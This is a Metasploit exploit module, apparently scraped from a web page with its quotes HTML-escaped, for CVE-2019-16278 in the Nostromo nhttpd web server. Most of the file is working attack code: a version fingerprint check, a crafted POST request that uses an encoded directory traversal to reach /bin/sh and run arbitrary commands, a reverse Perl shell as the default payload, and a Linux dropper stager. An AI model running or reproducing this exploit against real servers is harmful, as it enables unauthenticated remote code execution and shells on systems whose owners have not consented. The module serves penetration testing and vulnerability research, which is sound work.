# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

class MetasploitModule < Msf::Exploit::Remote
  Rank = GoodRanking

  include Msf::Exploit::CmdStager
  include Msf::Exploit::Remote::HttpClient

  def initialize(info = {})
    super(update_info(info,
      &#039;Name&#039;           => &#039;Nostromo Directory Traversal Remote Command Execution&#039;,
      &#039;Description&#039;    => %q{
          This module exploits a remote command execution vulnerability in
        Nostromo <= 1.9.6. This issue is caused by a directory traversal
        in the function `http_verify` in nostromo nhttpd allowing an attacker
        to achieve remote code execution via a crafted HTTP request.
      },
      &#039;Author&#039;         =>
        [
          &#039;Quentin Kaiser <kaiserquentin[at]gmail.com>&#039;, # metasploit module
          &#039;sp0re&#039;, # original public exploit
        ],
      &#039;License&#039;        => MSF_LICENSE,
      &#039;References&#039;     =>
        [
          [ &#039;CVE&#039;, &#039;2019-16278&#039;],
          [ &#039;URL&#039;, &#039;https://www.sudokaikan.com/2019/10/cve-2019-16278-unauthenticated-remote.html&#039;],
        ],
      &#039;Platform&#039;      => [&#039;linux&#039;, &#039;unix&#039;], # OpenBSD, FreeBSD, NetBSD, and Linux
      &#039;Arch&#039;  => [ARCH_CMD, ARCH_X86, ARCH_X64, ARCH_MIPSBE, ARCH_MIPSLE, ARCH_ARMLE, ARCH_AARCH64],
      &#039;Targets&#039;        =>
        [
          [&#039;Automatic (Unix In-Memory)&#039;,
            {
                &#039;Platform&#039; => &#039;unix&#039;,
                &#039;Arch&#039;  => ARCH_CMD,
                &#039;Type&#039;  => :unix_memory,
                &#039;DefaultOptions&#039;  => {&#039;PAYLOAD&#039; => &#039;cmd/unix/reverse_perl&#039;}
            }
          ],
          [&#039;Automatic (Linux Dropper)&#039;,
            {
                &#039;Platform&#039; => &#039;linux&#039;,
                &#039;Arch&#039;  => [ARCH_X86, ARCH_X64, ARCH_MIPSBE, ARCH_MIPSLE, ARCH_ARMLE, ARCH_AARCH64],
                &#039;Type&#039;  => :linux_dropper,
            }
          ]
        ],
      &#039;DisclosureDate&#039; => &#039;Oct 20 2019&#039;,
      &#039;DefaultTarget&#039; => 0,
      &#039;Notes&#039;         => {
        &#039;Stability&#039; => [CRASH_SAFE],
        &#039;Reliability&#039; => [REPEATABLE_SESSION],
        &#039;SideEffects&#039; => [IOC_IN_LOGS, ARTIFACTS_ON_DISK]
      }
    ))

    register_advanced_options([
      OptBool.new(&#039;ForceExploit&#039;, [false, &#039;Override check result&#039;, false])
    ])
  end

  def check
    res = send_request_cgi({
        &#039;method&#039;   => &#039;GET&#039;,
        &#039;uri&#039;      => normalize_uri(target_uri.path),
      }
    )

    unless res
      vprint_error("Connection failed")
      return CheckCode::Unknown
    end

    if res.code == 200 and res.headers[&#039;Server&#039;] =~ /nostromo [\d.]{5}/
      /nostromo (?<version>[\d.]{5})/ =~ res.headers[&#039;Server&#039;]
      if Gem::Version.new(version) <= Gem::Version.new(&#039;1.9.6&#039;)
        return CheckCode::Appears
      end
    end

    return CheckCode::Safe
  end

  def execute_command(cmd, opts = {})
    send_request_cgi({
      &#039;method&#039;  => &#039;POST&#039;,
      &#039;uri&#039;     => normalize_uri(target_uri.path, &#039;/.%0d./.%0d./.%0d./.%0d./bin/sh&#039;),
      &#039;headers&#039; => {&#039;Content-Length:&#039; => &#039;1&#039;},
      &#039;data&#039;    => "echo\necho\n#{cmd} 2>&1"
      }
    )
  end

  def exploit
    # These CheckCodes are allowed to pass automatically
    checkcodes = [
      CheckCode::Appears,
      CheckCode::Vulnerable
    ]

    unless checkcodes.include?(check) || datastore[&#039;ForceExploit&#039;]
      fail_with(Failure::NotVulnerable, &#039;Set ForceExploit to override&#039;)
    end

    print_status("Configuring #{target.name} target")

    case target[&#039;Type&#039;]
    when :unix_memory
      print_status("Sending #{datastore[&#039;PAYLOAD&#039;]} command payload")
      vprint_status("Generated command payload: #{payload.encoded}")

      res = execute_command(payload.encoded)

      if res && datastore[&#039;PAYLOAD&#039;] == &#039;cmd/unix/generic&#039;
        print_warning(&#039;Dumping command output in full response body&#039;)

        if res.body.empty?
          print_error(&#039;Empty response body, no command output&#039;)
          return
        end

        print_line(res.body)
      end
    when :linux_dropper
      print_status("Sending #{datastore[&#039;PAYLOAD&#039;]} command stager")
      execute_cmdstager
    end
  end
end

